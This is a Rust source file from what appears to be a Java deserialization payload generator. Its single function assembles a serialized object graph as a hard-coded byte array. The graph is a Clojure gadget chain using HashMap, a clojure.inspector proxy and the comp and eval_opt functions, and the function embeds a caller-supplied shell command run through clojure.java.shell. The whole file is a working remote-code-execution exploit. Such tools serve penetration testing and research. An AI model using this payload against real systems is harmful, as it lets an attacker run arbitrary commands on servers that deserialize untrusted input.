use crate::base::generate_string;

pub fn get_clojure(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [
        172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115,
        104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100,
        70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112,
        63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 69, 99, 108, 111,
        106, 117, 114, 101, 46, 105, 110, 115, 112, 101, 99, 116, 111, 114, 46, 112, 114, 111, 120,
        121, 36, 106, 97, 118, 97, 120, 46, 115, 119, 105, 110, 103, 46, 116, 97, 98, 108, 101, 46,
        65, 98, 115, 116, 114, 97, 99, 116, 84, 97, 98, 108, 101, 77, 111, 100, 101, 108, 36, 102,
        102, 49, 57, 50, 55, 52, 97, 114, 116, 216, 182, 95, 8, 77, 69, 2, 0, 1, 76, 0, 14, 95, 95,
        99, 108, 111, 106, 117, 114, 101, 70, 110, 77, 97, 112, 116, 0, 29, 76, 99, 108, 111, 106,
        117, 114, 101, 47, 108, 97, 110, 103, 47, 73, 80, 101, 114, 115, 105, 115, 116, 101, 110,
        116, 77, 97, 112, 59, 120, 114, 0, 36, 106, 97, 118, 97, 120, 46, 115, 119, 105, 110, 103,
        46, 116, 97, 98, 108, 101, 46, 65, 98, 115, 116, 114, 97, 99, 116, 84, 97, 98, 108, 101,
        77, 111, 100, 101, 108, 114, 203, 235, 56, 174, 1, 255, 190, 2, 0, 1, 76, 0, 12, 108, 105,
        115, 116, 101, 110, 101, 114, 76, 105, 115, 116, 116, 0, 37, 76, 106, 97, 118, 97, 120, 47,
        115, 119, 105, 110, 103, 47, 101, 118, 101, 110, 116, 47, 69, 118, 101, 110, 116, 76, 105,
        115, 116, 101, 110, 101, 114, 76, 105, 115, 116, 59, 120, 112, 115, 114, 0, 35, 106, 97,
        118, 97, 120, 46, 115, 119, 105, 110, 103, 46, 101, 118, 101, 110, 116, 46, 69, 118, 101,
        110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 76, 105, 115, 116, 145, 72, 204, 45, 115,
        223, 14, 222, 3, 0, 0, 120, 112, 112, 120, 115, 114, 0, 31, 99, 108, 111, 106, 117, 114,
        101, 46, 108, 97, 110, 103, 46, 80, 101, 114, 115, 105, 115, 116, 101, 110, 116, 65, 114,
        114, 97, 121, 77, 97, 112, 227, 55, 112, 15, 152, 197, 244, 223, 2, 0, 2, 76, 0, 5, 95,
        109, 101, 116, 97, 113, 0, 126, 0, 3, 91, 0, 5, 97, 114, 114, 97, 121, 116, 0, 19, 91, 76,
        106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 120, 114, 0,
        27, 99, 108, 111, 106, 117, 114, 101, 46, 108, 97, 110, 103, 46, 65, 80, 101, 114, 115,
        105, 115, 116, 101, 110, 116, 77, 97, 112, 93, 124, 47, 3, 116, 32, 114, 123, 2, 0, 2, 73,
        0, 5, 95, 104, 97, 115, 104, 73, 0, 7, 95, 104, 97, 115, 104, 101, 113, 120, 112, 255, 255,
        255, 255, 255, 255, 255, 255, 112, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97,
        110, 103, 46, 79, 98, 106, 101, 99, 116, 59, 144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0,
        120, 112, 0, 0, 0, 2, 116, 0, 8, 104, 97, 115, 104, 67, 111, 100, 101, 115, 114, 0, 26, 99,
        108, 111, 106, 117, 114, 101, 46, 99, 111, 114, 101, 36, 99, 111, 109, 112, 36, 102, 110,
        95, 95, 52, 55, 50, 55, 220, 238, 68, 128, 97, 2, 16, 185, 2, 0, 2, 76, 0, 1, 102, 116, 0,
        18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0,
        1, 103, 113, 0, 126, 0, 17, 120, 114, 0, 19, 99, 108, 111, 106, 117, 114, 101, 46, 108, 97,
        110, 103, 46, 82, 101, 115, 116, 70, 110, 196, 15, 123, 99, 199, 39, 53, 103, 2, 0, 0, 120,
        114, 0, 22, 99, 108, 111, 106, 117, 114, 101, 46, 108, 97, 110, 103, 46, 65, 70, 117, 110,
        99, 116, 105, 111, 110, 62, 6, 112, 156, 158, 70, 253, 203, 2, 0, 1, 76, 0, 17, 95, 95,
        109, 101, 116, 104, 111, 100, 73, 109, 112, 108, 67, 97, 99, 104, 101, 116, 0, 30, 76, 99,
        108, 111, 106, 117, 114, 101, 47, 108, 97, 110, 103, 47, 77, 101, 116, 104, 111, 100, 73,
        109, 112, 108, 67, 97, 99, 104, 101, 59, 120, 112, 112, 115, 114, 0, 21, 99, 108, 111, 106,
        117, 114, 101, 46, 109, 97, 105, 110, 36, 101, 118, 97, 108, 95, 111, 112, 116, 244, 17,
        166, 143, 20, 196, 228, 38, 2, 0, 0, 120, 113, 0, 126, 0, 19, 112, 115, 114, 0, 32, 99,
        108, 111, 106, 117, 114, 101, 46, 99, 111, 114, 101, 36, 99, 111, 110, 115, 116, 97, 110,
        116, 108, 121, 36, 102, 110, 95, 95, 52, 54, 49, 52, 85, 228, 93, 198, 125, 224, 180, 212,
        2, 0, 1, 76, 0, 1, 120, 113, 0, 126, 0, 17, 120, 113, 0, 126, 0, 18, 112,
    ]
    .to_vec();
    let c = format!("(use '[clojure.java.shell :only [sh]]) (sh \"{}\")", cmd);
    result_bytes.extend(generate_string(&c));
    result_bytes.extend([112, 120]);
    result_bytes
}
